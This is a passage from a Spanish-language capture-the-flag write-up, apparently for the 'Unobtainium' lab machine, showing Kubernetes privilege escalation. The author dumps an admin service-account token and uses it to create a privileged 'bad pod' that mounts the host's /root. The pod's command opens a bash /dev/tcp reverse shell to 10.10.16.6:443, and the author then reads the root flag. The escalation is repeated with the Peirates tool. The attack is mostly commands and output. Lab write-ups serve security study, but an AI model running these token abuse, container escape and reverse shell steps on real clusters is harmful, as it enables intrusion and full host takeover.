replication-controller-token-9m8mh                   kubernetes.io/service-account-token   3      176d
service-account-controller-token-6vsl2               kubernetes.io/service-account-token   3      176d
node-controller-token-dfztj                          kubernetes.io/service-account-token   3      176d
metrics-server-token-d4k84                           kubernetes.io/service-account-token   3      176d
pvc-protection-controller-token-btkqg                kubernetes.io/service-account-token   3      176d
pv-protection-controller-token-k8gq8                 kubernetes.io/service-account-token   3      176d
endpoint-controller-token-zd5b9                      kubernetes.io/service-account-token   3      176d
disruption-controller-token-cnqj8                    kubernetes.io/service-account-token   3      176d
cronjob-controller-token-csxvj                       kubernetes.io/service-account-token   3      176d
endpointslice-controller-token-wrnvm                 kubernetes.io/service-account-token   3      176d
pod-garbage-collector-token-56dzk                    kubernetes.io/service-account-token   3      176d
namespace-controller-token-g8jmq                     kubernetes.io/service-account-token   3      176d
daemon-set-controller-token-b68xx                    kubernetes.io/service-account-token   3      176d
replicaset-controller-token-7fkxv                    kubernetes.io/service-account-token   3      176d
job-controller-token-xctqc                           kubernetes.io/service-account-token   3      176d
ttl-controller-token-rsshv                           kubernetes.io/service-account-token   3      176d
deployment-controller-token-npk6k                    kubernetes.io/service-account-token   3      176d
attachdetach-controller-token-xvj9h                  kubernetes.io/service-account-token   3      176d
endpointslicemirroring-controller-token-b5r69        kubernetes.io/service-account-token   3      176d
resourcequota-controller-token-8pp4p                 kubernetes.io/service-account-token   3      176d
generic-garbage-collector-token-5nkzj                kubernetes.io/service-account-token   3      176d
persistent-volume-binder-token-865v2                 kubernetes.io/service-account-token   3      176d
expand-controller-token-f2csp                        kubernetes.io/service-account-token   3      176d
clusterrole-aggregation-controller-token-wp8k6       kubernetes.io/service-account-token   3      176d
default-token-h5tf2                                  kubernetes.io/service-account-token   3      176d
c-admin-token-b47f7                                  kubernetes.io/service-account-token   3      176d
k3s-serving                                          kubernetes.io/tls                     2      176d
```

Puedo dumpear un token del usuario Administrador. Esto me puede servir para adquirir el privilegio de crear un POD

```null
root@devnode-deployment-776dbcf7d6-sr6vj:/tmp# ./kbctl describe secrets/c-admin-token-b47f7 -n kube-system
Name:         c-admin-token-b47f7
Namespace:    kube-system
Labels:       <none>
Annotations:  kubernetes.io/service-account.name: c-admin
              kubernetes.io/service-account.uid: 31778d17-908d-4ec3-9058-1e523180b14c

Type:  kubernetes.io/service-account-token

Data
====
ca.crt:     570 bytes
namespace:  11 bytes
token:      eyJhbGciOiJSUzI1NiIsImtpZCI6InRqSFZ0OThnZENVcDh4SXltTGhfU0hEX3A2UXBhMG03X2pxUVYtMHlrY2cifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLWI0N2Y3Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIzMTc3OGQxNy05MDhkLTRlYzMtOTA1OC0xZTUyMzE4MGIxNGMiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.fka_UUceIJAo3xmFl8RXncWEsZC3WUROw5x6dmgQh_81eam1xyxq_ilIz6Cj6H7v5BjcgIiwsWU9u13veY6dFErOsf1I10nADqZD66VQ24I6TLqFasTpnRHG_ezWK8UuXrZcHBu4Hrih4LAa2rpORm8xRAuNVEmibYNGhj_PNeZ6EWQJw7n87lir2lYcqGEY11kXBRSilRU1gNhWbnKoKReG_OThiS5cCo2ds8KDX6BZwxEpfW4A7fKC-SdLYQq6_i2EzkVoBg8Vk2MlcGhN-0_uerr6rPbSi9faQNoKOZBYYfVHGGM3QDCAk3Du-YtByloBCfTw8XylG9EuTgtgZA
```

```null
root@devnode-deployment-776dbcf7d6-sr6vj:/tmp# ./kbctl auth can-i create pod
no
root@devnode-deployment-776dbcf7d6-sr6vj:/tmp# ./kbctl auth can-i create pod --token eyJhbGciOiJSUzI1NiIsImtpZCI6InRqSFZ0OThnZENVcDh4SXltTGhfU0hEX3A2UXBhMG03X2pxUVYtMHlrY2cifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLWI0N2Y3Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIzMTc3OGQxNy05MDhkLTRlYzMtOTA1OC0xZTUyMzE4MGIxNGMiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.fka_UUceIJAo3xmFl8RXncWEsZC3WUROw5x6dmgQh_81eam1xyxq_ilIz6Cj6H7v5BjcgIiwsWU9u13veY6dFErOsf1I10nADqZD66VQ24I6TLqFasTpnRHG_ezWK8UuXrZcHBu4Hrih4LAa2rpORm8xRAuNVEmibYNGhj_PNeZ6EWQJw7n87lir2lYcqGEY11kXBRSilRU1gNhWbnKoKReG_OThiS5cCo2ds8KDX6BZwxEpfW4A7fKC-SdLYQq6_i2EzkVoBg8Vk2MlcGhN-0_uerr6rPbSi9faQNoKOZBYYfVHGGM3QDCAk3Du-YtByloBCfTw8XylG9EuTgtgZA
yes
```

En este [artículo](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation) explican como crear un Bad POD para escapar del contenedor. Descargo un archivo YAML de ejemplo que se encarga del despliegue del contenedor

```null
wget https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml
```

Para extraer la imagen necesaria para crear el contenedor, se puede una existente en cualquier POD

```null
root@webapp-deployment-9546bc7cb-6r7sq:/tmp# ./kbctl describe pods/devnode-deployment-776dbcf7d6-sr6vj -n dev | grep Image 
    Image:          localhost:5000/node_server
    Image ID:       docker-pullable://localhost:5000/node_server@sha256:e965afd6a7e1ef3093afdfa61a50d8337f73cd65800bdeb4501ddfbc598016f5
```

Modifico el ```pod.yaml``` que se encargue de enviarme la reverse shell

```null
apiVersion: v1
kind: Pod
metadata:
  name: pwned
spec:
  hostNetwork: true
  containers:
  - name: pwned
    image: localhost:5000/node_server
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /root/
      name: noderoot
    command: [ "/bin/bash", "-c" ]
    args: [ "bash -i >& /dev/tcp/10.10.16.6/443 0>&1;" ]
  volumes:
  - name: noderoot
    hostPath:
      path: /root/
```

Creo el POD y gano acceso en una sesión de netcat

```null
root@devnode-deployment-776dbcf7d6-sr6vj:/tmp# ./kbctl create -f pod.yaml --token eyJhbGciOiJSUzI1NiIsImtpZCI6InRqSFZ0OThnZENVcDh4SXltTGhfU0hEX3A2UXBhMG03X2pxUVYtMHlrY2cifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2Vh
Y2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLWI0N2Y3Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3Vud
C9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIzMTc3OGQxNy05MDhkLTRlYzMtOTA1OC0xZTUyMzE4MGIxNGMiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS
1zeXN0ZW06Yy1hZG1pbiJ9.fka_UUceIJAo3xmFl8RXncWEsZC3WUROw5x6dmgQh_81eam1xyxq_ilIz6Cj6H7v5BjcgIiwsWU9u13veY6dFErOsf1I10nADqZD66VQ24I6TLqFasTpnRHG_ezWK8UuXrZcHBu4Hrih4LAa2rpORm8xRAuNVEmibYNGhj_PNeZ6EWQJw7n87lir2l
YcqGEY11kXBRSilRU1gNhWbnKoKReG_OThiS5cCo2ds8KDX6BZwxEpfW4A7fKC-SdLYQq6_i2EzkVoBg8Vk2MlcGhN-0_uerr6rPbSi9faQNoKOZBYYfVHGGM3QDCAk3Du-YtByloBCfTw8XylG9EuTgtgZA
pod/pwned created
```

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.10.235] 43124
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@unobtainium:/usr/src/app# script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
root@unobtainium:/usr/src/app# ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
root@unobtainium:/usr/src/app# export TERM=xterm
root@unobtainium:/usr/src/app# export SHELL=bash
root@unobtainium:/usr/src/app# stty rows 55 columns 209
```

Puedo ver la segunda flag

```null
root@unobtainium:~# cat root.txt  
1e775b0bb9036ef44e911b727e2000a0
```

Una forma de automatizar la escalada sería utilizando la herramienta ```Peirates```, disponible en [Github](https://github.com/inguardians/peirates/releases/tag/v1.1.10)

```null
root@devnode-deployment-776dbcf7d6-sr6vj:/tmp# ./peirates -t eyJhbGciOiJSUzI1NiIsImtpZCI6InRqSFZ0OThnZENVcDh4SXltTGhfU0hEX3A2UXBhMG03X2pxUVYtMHlrY2cifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLWI0N2Y3Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIzMTc3OGQxNy05MDhkLTRlYzMtOTA1OC0xZTUyMzE4MGIxNGMiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.fka_UUceIJAo3xmFl8RXncWEsZC3WUROw5x6dmgQh_81eam1xyxq_ilIz6Cj6H7v5BjcgIiwsWU9u13veY6dFErOsf1I10nADqZD66VQ24I6TLqFasTpnRHG_ezWK8UuXrZcHBu4Hrih4LAa2rpORm8xRAuNVEmibYNGhj_PNeZ6EWQJw7n87lir2lYcqGEY11kXBRSilRU1gNhWbnKoKReG_OThiS5cCo2ds8KDX6BZwxEpfW4A7fKC-SdLYQq6_i2EzkVoBg8Vk2MlcGhN-0_uerr6rPbSi9faQNoKOZBYYfVHGGM3QDCAk3Du-YtByloBCfTw8XylG9EuTgtgZA

Peirates:># 10
[+] Secret found:  default-token-w22lv
[+] Service account found:  default-token-w22lv

Peirates:># 20
Your IP addresses: 
10.42.0.46
What IP and Port will your netcat listener be listening on?
IP:
10.10.16.6
Port:
443
[+] Using your current pod's image: localhost:5000/node_server
[+] Executing code in attack-pod-yifuqv - please wait for Pod to stage
[+] Netcat callback added sucessfully.
[+] Removing attack pod.
```

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.10.235] 45750
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@unobtainium:/usr/src/app# 
```